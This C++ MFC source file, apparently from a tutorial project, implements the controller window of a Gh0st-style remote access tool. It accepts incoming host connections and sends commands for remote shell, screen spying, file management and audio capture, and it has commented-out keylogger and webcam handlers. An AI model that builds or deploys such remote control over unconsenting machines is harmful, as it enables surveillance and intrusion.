
// PCRemoteDlg.cpp: 实现文件
//

#include "stdafx.h"
#include "PCRemote.h"
#include "PCRemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include"../common/macros.h"
#include<WS2tcpip.h>
#include"ShellDlg.h"
#include"SystemDlg.h"
#include"ScreenSpyDlg.h"
#include"FileManagerDlg.h"
#include"AudioDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct
{
	LPCTSTR title;	// 列表的名称
	int nWidth;		// 列表的宽度
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Online_Data[] = 
{
	{"IP",148},{"区域",150},{"计算机名/备注",170},{"操作系统",128},{"CPU",80},{"摄像头",81},{"Ping",81}
};

int g_Column_Count_Online = 7;	// 上线列表的个数
int g_Column_Online_Width = 0;	// 上线列表的总宽度
COLUMNSTRUCT g_Column_Message_Data[] = 
{
	{"信息类型",68},{"时间",220},{"信息内容",460}
};

int g_Column_Count_Message = 3;	// 日志列表个数
int g_Column_Message_Width = 0;	// 日志列表的总宽度

CIOCPServer *m_iocpServer = NULL;
CPCRemoteDlg *g_pPCRemoteDlg = NULL;

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框
class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CPCRemoteDlg 对话框



CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_PCREMOTE_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	iCount = 0;
	g_pPCRemoteDlg = this;
	if (((CPCRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
}

void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_OnLine);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CPCRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CPCRemoteDlg::OnOnlineAudio)
	ON_COMMAND(IDM_ONLINE_CMD, &CPCRemoteDlg::OnOnlineCmd)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CPCRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(IDM_ONLINE_FILE, &CPCRemoteDlg::OnOnlineFile)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CPCRemoteDlg::OnOnlineProcess)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CPCRemoteDlg::OnOnlineRegister)
	ON_COMMAND(IDM_ONLINE_SERVER, &CPCRemoteDlg::OnOnlineServer)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CPCRemoteDlg::OnOnlineVideo)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CPCRemoteDlg::OnOnlineWindow)
	ON_COMMAND(IDM_ONLINE_DELETE, &CPCRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_MAIN_ABOUT, &CPCRemoteDlg::OnMainAbout)
	ON_COMMAND(IDM_MAIN_BUILD, &CPCRemoteDlg::OnMainBuild)
	ON_COMMAND(IDM_MAIN_CLOSE, &CPCRemoteDlg::OnMainClose)
	ON_COMMAND(IDM_MAIN_SET, &CPCRemoteDlg::OnMainSet)
	// 自定义消息
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))CPCRemoteDlg::OnIconNotify)
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG,OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)

	// 自定义事件
	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
	ON_WM_CLOSE()
END_MESSAGE_MAP()

//lang2.1_9  NotifyProc是这个socket内核的核心  所有的关于socket 的处理都要调用这个函数
void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	//::MessageBox(NULL, L"有连接到来！！", NULL, NULL);
	try
	{
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			//ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext); //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete
			break;
		}
	}
	catch (...) {}
}


void CPCRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	////lang2.1_8
	// 开启IPCP服务器 最大连接  端口     查看NotifyProc回调函数  函数定义
	if (m_iocpServer->Initialize(NotifyProc, NULL, 100000, nPort))
	{

		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{
			for (int i = 0; ; i++)
			{
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if (host->h_addr_list[i] + host->h_length >= host->h_name)
					break;
				str += "/";
			}
		}

		//m_wndStatusBar.SetPaneText(0, str);
		//str.Format("端口: %d", nPort);
		//m_wndStatusBar.SetPaneText(2, str);
		str.Format("监听端口: %d 成功", nPort);
		ShowMessage(true, str);
	}
	else
	{
		//str.Format("端口%d绑定失败", nPort);
		//m_wndStatusBar.SetPaneText(0, str);
		//m_wndStatusBar.SetPaneText(2, "端口: 0");
		str.Format("监听端口: %d 失败", nPort);
		ShowMessage(false, str);
	}

	//m_wndStatusBar.SetPaneText(3, "连接: 0");
}

void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];//这里就是ClientContext 结构体的int m_Dialog[2];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
	{
		switch (pContext->m_Dialog[0])
		{
		/*
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;*/
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
	{                                                           //讲解后回到ClientContext结构体
	/*case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;*/
	case TOKEN_LOGIN: // 上线包

	{
		//这里处理上线
		if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_OnLine.GetItemCount())
		{
			closesocket(pContext->m_Socket);
		}
		else
		{
			pContext->m_bIsMainSocket = true;
			g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		}
		// 激活
		BYTE	bToken = COMMAND_ACTIVED;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	}

	break;
	/*
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;*/
	case TOKEN_AUDIO_START: // 语音
		g_pPCRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		g_pPCRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		g_pPCRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WSLIST:
	case TOKEN_PSLIST:
		g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}
}

void CPCRemoteDlg::ListenPort()
{
	// TODO: 在此处添加实现代码.
	int nPort = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");
	int nMaxConnection = ((CPCRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");
	if (nPort == 0)
		nPort = 80;
	if (nMaxConnection == 0)
		nMaxConnection = 1000;
	Activate(nPort, nMaxConnection);
}

// CPCRemoteDlg 消息处理程序

BOOL CPCRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// ShowWindow(SW_MAXIMIZE);

	ShowWindow(SW_MINIMIZE);

	// TODO: 在此添加额外的初始化代码
	HMENU hMenu;
	hMenu = LoadMenu(NULL, MAKEINTRESOURCE(IDR_MENU_MAIN));
	::SetMenu(this->GetSafeHwnd(), hMenu);
	::DrawMenuBar(this->GetSafeHwnd());
	InitList();		// Init List
	CreateStatusBar();	// 创建状态栏
	CreateToolBar();
	nid.cbSize = sizeof(nid);
	nid.hWnd = m_hWnd;
	nid.uID = IDR_MAINFRAME;
	nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	nid.uCallbackMessage = UM_ICONNOTIFY;
	nid.hIcon = m_hIcon;
	CString str = "Windows PC远控软件";
	lstrcpyn(nid.szTip, str, sizeof(nid.szTip) / sizeof(nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &nid);	// 显示托盘

	ShowMessage(true, "软件初始化成功...");

	ListenPort();	// 开始监听
	//Test();
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 20;
	MoveWindow(rect);
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CPCRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CPCRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CPCRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CPCRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	// TODO: 在此处添加消息处理程序代码
	double dcx = cx;	// 对话框的总宽度
	if (SIZE_MINIMIZED == nType)
	{
		return;
	}
	if (m_CList_OnLine.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;
		rc.top = 100;
		rc.right = cx - 1;
		rc.bottom = cy - 240;
		m_CList_OnLine.MoveWindow(rc);
		for (int i = 0; i < g_Column_Count_Online; i++)
		{
			double dd = g_Column_Online_Data[i].nWidth;
			dd /= g_Column_Online_Width;
			dd *= dcx;
			int width = dd;
			m_CList_OnLine.SetColumnWidth(i, width);
		}
	}

	if (m_CList_Message.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;
		rc.top = cy - 230;
		rc.right = cx - 1;
		rc.bottom = cy - 30;
		m_CList_Message.MoveWindow(rc);
		for (int i = 0; i < g_Column_Count_Message; ++i)
		{
			double dd = g_Column_Message_Data[i].nWidth;
			dd /= g_Column_Message_Width;
			dd *= dcx;
			int width = dd;
			m_CList_Message.SetColumnWidth(i, width);
		}
	}

	if (m_wndStatusBar.m_hWnd != NULL) {	// 使状态条大小随窗口变化
		CRect rc;
		rc.top = cy-25;
		rc.left = 0;
		rc.right = cx;
		rc.bottom = cy;
		m_wndStatusBar.MoveWindow(rc);
		m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}

	if (m_ToolBar.m_hWnd != NULL)	// 工具条
	{
		CRect rc;
		rc.left = rc.top = 0;
		rc.right = cx;
		rc.bottom = 80;
		m_ToolBar.MoveWindow(rc);
	}
}


// init list
int CPCRemoteDlg::InitList()
{
	// TODO: 在此处添加实现代码.
	// init online list
	m_CList_OnLine.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < g_Column_Count_Online; ++i)
	{
		m_CList_OnLine.InsertColumn(i, g_Column_Online_Data[i].title, LVCFMT_CENTER, g_Column_Online_Data[i].nWidth,-1);
		g_Column_Online_Width += g_Column_Online_Data[i].nWidth;
	}
	// init msg list
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < g_Column_Count_Message; ++i)
	{
		m_CList_Message.InsertColumn(i, g_Column_Message_Data[i].title, LVCFMT_CENTER, g_Column_Message_Data[i].nWidth, -1);
		g_Column_Message_Width += g_Column_Message_Data[i].nWidth;
	}
	return 0;
}


int CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext *pContext)
{
	// TODO: 在此处添加实现代码.
	m_CList_OnLine.InsertItem(0, strIP);
	m_CList_OnLine.SetItemText(0, ONLINELIST_ADDR, strAddr);
	m_CList_OnLine.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName);
	m_CList_OnLine.SetItemText(0, ONLINELIST_OS, strOS);
	m_CList_OnLine.SetItemText(0, ONLINELIST_CPU, strCPU);
	m_CList_OnLine.SetItemText(0, ONLINELIST_VIDEO, strVideo);
	m_CList_OnLine.SetItemText(0, ONLINELIST_PING, strPing);
	m_CList_OnLine.SetItemData(0, (DWORD)pContext);

	strIP += "  主机上线";
	ShowMessage(true, strIP);
	return 0;
}


// show message
void CPCRemoteDlg::ShowMessage(bool bIsOk, CString strMsg)
{
	// TODO: 在此处添加实现代码.
	CString strIsOk, strTime;
	CTime t = CTime::GetCurrentTime();
	strTime = t.Format("%c");
	if (bIsOk)
	{
		strIsOk = "执行成功";
	}
	else {
		strIsOk = "执行失败";
	}
	m_CList_Message.InsertItem(0, strIsOk);
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strMsg);

	CString strStatusMsg;
	if (strMsg.Find("上线") > 0)
	{
		iCount++;
	}
	else if (strMsg.Find("下线") > 0)
	{
		iCount--;
	}
	else if (strMsg.Find("断开") > 0)
	{
		iCount--;
	}
	iCount = (iCount <= 0 ?0: iCount);	// 防止-1的出现
	strStatusMsg.Format("连接: %d", iCount);
	m_wndStatusBar.SetPaneText(0, strStatusMsg);
}


void CPCRemoteDlg::Test()
{
	// TODO: 在此处添加实现代码.
	/*AddList(L"192.168.0.1", L"本机局域网", L"Lang", L"Windows 7", L"2.2GHZ",L"有", L"123");
	AddList(L"192.168.0.2", L"本机局域网", L"Lang", L"Windows 7", L"2.2GHZ", L"有", L"123");
	AddList(L"192.168.0.3", L"本机局域网", L"Lang", L"Windows 7", L"2.2GHZ", L"有", L"123");
	AddList(L"192.168.0.4", L"本机局域网", L"Lang", L"Windows 7", L"2.2GHZ", L"有", L"123");*/

}


void CPCRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu popup;
	popup.LoadMenu(IDR_MENU_ONLINE);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint p;
	GetCursorPos(&p);
	int count = pM->GetMenuItemCount();
	if (m_CList_OnLine.GetSelectedCount() == 0)	// 未选中
	{
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}


void CPCRemoteDlg::OnOnlineAudio()
{
	// TODO: 在此添加命令处理程序代码
	// MessageBox("语音管理");
	BYTE	bToken = COMMAND_AUDIO;                 //向服务端发送命令 服务端中搜索
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CPCRemoteDlg::OnOnlineCmd()
{
	// TODO: 在此添加命令处理程序代码
	// MessageBox("终端管理");
	BYTE	bToken = COMMAND_SHELL;              //lang4.2.1        向服务端发送一个COMMAND_SHELL命令  到svchost中搜之
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	//这里定义远程终端的对话框，转到远程终端的CShellDlg类的定义  先查看对话框界面后转到OnInitDialog
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为桌面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


void CPCRemoteDlg::OnOnlineDesktop()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_SCREEN_SPY;  //向服务端发送COMMAND_SCREEN_SPY CKernelManager::OnReceive搜之
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为桌面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

void CPCRemoteDlg::OnOnlineFile()
{
	// TODO: 在此添加命令处理程序代码
	// MessageBox("文件管理");
	BYTE	bToken = COMMAND_LIST_DRIVE;            //在服务端中搜索COMMAND_LIST_DRIVE
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{

	ClientContext *pContext = (ClientContext *)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为桌面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

void CPCRemoteDlg::OnOnlineProcess()
{
	// TODO: 在此添加命令处理程序代码
	// MessageBox("进程管理");
	BYTE	bToken = COMMAND_SYSTEM;         //赋值一个宏 然后发送到服务端，到服务端搜索COMMAND_SYSTEM
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为桌面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = SYSTEM_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}

void CPCRemoteDlg::OnOnlineRegister()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("注册表管理");
}


void CPCRemoteDlg::OnOnlineServer()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("服务管理");
}


void CPCRemoteDlg::OnOnlineVideo()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("视频管理");
}


void CPCRemoteDlg::OnOnlineWindow()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = COMMAND_WSLIST;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CPCRemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码
	CString strIP;
	int iSelect = m_CList_OnLine.GetSelectionMark();
	strIP = m_CList_OnLine.GetItemText(iSelect, ONLINELIST_IP);
	m_CList_OnLine.DeleteItem(iSelect);
	strIP += "  主机断开连接";
	ShowMessage(true, strIP);
}


void CPCRemoteDlg::OnMainAbout()
{
	// TODO: 在此添加命令处理程序代码
	CAboutDlg dlgAbout;
	dlgAbout.DoModal();
}


void CPCRemoteDlg::OnMainBuild()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("生成服务端");
}


void CPCRemoteDlg::OnMainClose()
{
	// TODO: 在此添加命令处理程序代码
	PostMessage(WM_CLOSE, 0, 0);
}


void CPCRemoteDlg::OnMainSet()
{
	// TODO: 在此添加命令处理程序代码
	CSettingDlg SettingDlg;
	SettingDlg.DoModal();
}

static UINT indicators[] = 
{
	IDR_STATUSBAR_STRING
};


// create status bar
void CPCRemoteDlg::CreateStatusBar()
{
	// TODO: 在此处添加实现代码.
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0("Failed to creat status bar\n");
		return;		// fail to creat
	}
	CRect rc;
	::GetWindowRect(m_wndStatusBar.m_hWnd, rc);
	m_wndStatusBar.MoveWindow(rc);
}


void CPCRemoteDlg::CreateToolBar()
{
	// TODO: 在此处添加实现代码.
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("Failed to create toolbar\n");
		return;
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);	// Fix for WinXP
	// 加载真彩工具条
	m_ToolBar.LoadTrueColorToolBar(48,IDB_BITMAP_MAIN,IDB_BITMAP_MAIN,IDB_BITMAP_MAIN);

	RECT rt, rtMain;
	GetWindowRect(&rtMain);
	rt.left = 0;
	rt.top = 0;
	rt.bottom = 80;
	rt.right = rtMain.right - rtMain.left + 10;
	m_ToolBar.MoveWindow(&rt, TRUE);

	m_ToolBar.SetButtonText(0, "终端管理");
	m_ToolBar.SetButtonText(1, "进程管理");
	m_ToolBar.SetButtonText(2, "窗口管理");
	m_ToolBar.SetButtonText(3, "桌面管理");
	m_ToolBar.SetButtonText(4, "文件管理");
	m_ToolBar.SetButtonText(5, "语音管理");
	m_ToolBar.SetButtonText(6, "视频管理");
	m_ToolBar.SetButtonText(7, "服务管理");
	m_ToolBar.SetButtonText(8, "注册表管理");

	m_ToolBar.SetButtonText(10, "参数设置");
	m_ToolBar.SetButtonText(11, "生成服务端");
	m_ToolBar.SetButtonText(12, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
}

void CPCRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	CMenu menu;
	CPoint point;
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
		if (!IsWindowVisible())
			::ShowWindow(m_hWnd, SW_SHOW);
		else
			::ShowWindow(m_hWnd, SW_HIDE);
		break;
	case WM_RBUTTONDOWN:
		menu.LoadMenu(IDR_MENU_NOTIFY);
		GetCursorPos(&point);
		SetForegroundWindow();
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			point.x, point.y, this, NULL);
		PostMessage(WM_USER, 0, 0);
		break;
	default:
		break;
	}
}


void CPCRemoteDlg::OnNotifyClose()
{
	// TODO: 在此添加命令处理程序代码
	PostMessage(WM_CLOSE);
}


void CPCRemoteDlg::OnNotifyShow()
{
	// TODO: 在此添加命令处理程序代码
	::ShowWindow(m_hWnd, SW_SHOW);
}


void CPCRemoteDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	Shell_NotifyIcon(NIM_DELETE, &nid);
	CDialogEx::OnClose();
}

LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	CString strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing;
	ClientContext	*pContext = (ClientContext *)lParam;    //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText;
	try
	{
		//int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		// ID
		//CString	str;
		//str.Format("%d", m_nCount++);	

		// IP地址
		//int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP
		CHAR IPAddress[25] = { 0 };
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

		if (bResult != INVALID_SOCKET)
		{
			InetNtop(AF_INET, &sockAddr.sin_addr, IPAddress, sizeof(IPAddress));
		}

		// CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		//m_pListCtrl->SetItemText(i, 1, IPAddress);
